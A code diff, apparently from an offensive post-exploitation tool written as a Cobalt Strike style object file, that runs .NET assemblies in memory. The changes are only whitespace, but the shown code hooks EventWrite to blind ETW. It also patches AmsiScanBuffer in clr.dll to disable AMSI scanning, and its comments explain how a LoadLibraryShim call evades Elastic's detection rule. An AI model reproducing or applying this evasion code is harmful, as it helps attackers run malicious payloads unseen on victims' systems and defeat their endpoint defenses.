@@ -35,8 +35,8 @@ int go(char* args, ULONG length)
 	LPSTR OutputBuffer = (LPSTR)KERNEL32$HeapAlloc(KERNEL32$GetProcessHeap(), HEAP_ZERO_MEMORY, 0x100000);
 	ULONG OutputLength = 0;
     
-    /* Bypass ETW with EAT Hooking */
-    HMODULE advapi = KERNEL32$LoadLibraryA("advapi32.dll");
+    	/* Bypass ETW with EAT Hooking */
+    	HMODULE advapi = KERNEL32$LoadLibraryA("advapi32.dll");
 	PVOID originalFunc = (PVOID)KERNEL32$GetProcAddress(advapi, "EventWrite");
 	if (!EATHook(advapi, const_cast<char*>("EventWrite"), reinterpret_cast<VOID*>(&DummyFunction), reinterpret_cast<VOID**>(&originalFunc)))
 		return -1;
@@ -65,7 +65,7 @@ BOOL Executedotnet(PBYTE AssemblyBytes, ULONG AssemblySize, LPCWSTR wAssemblyArg
 	HRESULT HResult = NULL;
 	ICLRMetaHost* metaHost = NULL;
  
-    HResult = MSCOREE$CLRCreateInstance(xCLSID_CLRMetaHost, xIID_ICLRMetaHost, (PVOID*)&metaHost); // Spawns mscoreei.dll
+   	HResult = MSCOREE$CLRCreateInstance(xCLSID_CLRMetaHost, xIID_ICLRMetaHost, (PVOID*)&metaHost); // Spawns mscoreei.dll
     
 	ICLRRuntimeInfo* runtimeInfo = NULL;
 	LPCWSTR wVersion;
@@ -90,10 +90,10 @@ BOOL Executedotnet(PBYTE AssemblyBytes, ULONG AssemblySize, LPCWSTR wAssemblyArg
 	
 	ICorRuntimeHost* runtimeHost = NULL; // ICorRuntimeHost has CreateDomain while ICLRRuntimeHost doesnt.
 	
-    HMODULE phModDll = NULL;
+    	HMODULE phModDll = NULL;
 	HRESULT hResult = MSCOREE$LoadLibraryShim(L"clr.dll", wVersion, NULL, &phModDll); // We LoadLibraryShim in order to have the callstack bypass Elastic's detection query. Once clr.dll is loaded, run GetInterface
     
-    if (!PatchAmsiScanBuffer(phModDll)) // Patch clr.dll to bypass amsi
+    	if (!PatchAmsiScanBuffer(phModDll)) // Patch clr.dll to bypass amsi
 	    return FALSE;
 
 	HResult = runtimeInfo->GetInterface(xCLSID_CorRuntimeHost, xIID_ICorRuntimeHost, (PVOID*)&runtimeHost); // This will load clr.dll if we didn't LoadLibraryShim
@@ -105,8 +105,8 @@ BOOL Executedotnet(PBYTE AssemblyBytes, ULONG AssemblySize, LPCWSTR wAssemblyArg
 	IUnknown* IUAppDomain = NULL;
 	HResult = runtimeHost->CreateDomain((PWSTR)pFriendlyName, nullptr, &IUAppDomain); // Only accepts an IUnknown interface. Also, at the end we will unload the domain with this same ICorRuntimeHost interface
     
-    _AppDomain* AppDomain = NULL;
-    HResult = IUAppDomain->QueryInterface(xIID_AppDomain, (VOID**)&AppDomain); // Use the IUnknown interface's QueryInterface method to get a pointer to an interface we want; in our case _AppDomain AppDomain
+    	_AppDomain* AppDomain = NULL;
+   	HResult = IUAppDomain->QueryInterface(xIID_AppDomain, (VOID**)&AppDomain); // Use the IUnknown interface's QueryInterface method to get a pointer to an interface we want; in our case _AppDomain AppDomain
       
 	SAFEARRAYBOUND SafeArrayBound = { AssemblySize, 0 };
 	SAFEARRAY* SafeAssembly = OLEAUT32$SafeArrayCreate(VT_UI1, 1, &SafeArrayBound); // Create safe array because Load_3 requires it as a safe array. https://learn.microsoft.com/en-us/archive/msdn-magazine/2017/march/introducing-the-safearray-data-structure#creating-a-safe-array
@@ -180,8 +180,8 @@ BOOL Executedotnet(PBYTE AssemblyBytes, ULONG AssemblySize, LPCWSTR wAssemblyArg
 	}
 	
 	/* This part was necessary in order to allocate a console from backed memory. I need to figure out how read output without allocating a console. */
-    KERNEL32$QueueUserAPC((PAPCFUNC)KERNEL32$AllocConsole, (HANDLE)-2, NULL);
-    typedef NTSTATUS(NTAPI* myNtTestAlert)();
+    	KERNEL32$QueueUserAPC((PAPCFUNC)KERNEL32$AllocConsole, (HANDLE)-2, NULL);
+    	typedef NTSTATUS(NTAPI* myNtTestAlert)();
 	myNtTestAlert testAlert = (myNtTestAlert)(KERNEL32$GetProcAddress(GetModuleHandleA("ntdll"), "NtTestAlert"));
 	testAlert();
     
@@ -205,7 +205,7 @@ BOOL Executedotnet(PBYTE AssemblyBytes, ULONG AssemblySize, LPCWSTR wAssemblyArg
 	
 	KERNEL32$CloseHandle(IoPipeRead);
 	KERNEL32$CloseHandle(IoPipeWrite);
-    KERNEL32$FreeConsole();
+    	KERNEL32$FreeConsole();
 
 	if (AssemblyArgv) {
 		KERNEL32$HeapFree(KERNEL32$GetProcessHeap(), HEAP_ZERO_MEMORY, AssemblyArgv);
@@ -235,8 +235,8 @@ BOOL Executedotnet(PBYTE AssemblyBytes, ULONG AssemblySize, LPCWSTR wAssemblyArg
 	if (AppDomain)
 		AppDomain->Release();
 
-    if (IUAppDomain)
-        IUAppDomain->Release();
+    	if (IUAppDomain)
+        	IUAppDomain->Release();
 
 	if (runtimeHost)
 		runtimeHost->Release();
